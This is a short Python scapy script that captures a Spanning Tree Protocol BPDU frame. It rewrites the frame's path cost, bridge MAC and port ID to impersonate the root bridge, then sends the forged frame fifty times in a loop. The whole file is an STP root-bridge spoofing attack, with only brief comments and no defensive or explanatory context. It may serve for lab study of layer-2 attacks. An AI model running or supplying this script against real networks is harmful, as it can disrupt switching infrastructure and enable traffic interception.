#Import scapy
from scapy.all import *
#Capture STP frame
pkt = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)    

#Block port to root switch
#Set cost to root to zero
pkt[0].pathcost = 0

#Set bridge MAC to root brige
pkt[0].bridgemac = pkt[0].rootmac
#Set port ID to 1
pkt[0].portid = 1

#Loop to send multiple BPDUs
for i in range (0, 50):
    time.sleep(1)
    pkt[0].show()
    sendp(pkt[0], loop=0, verbose=1)

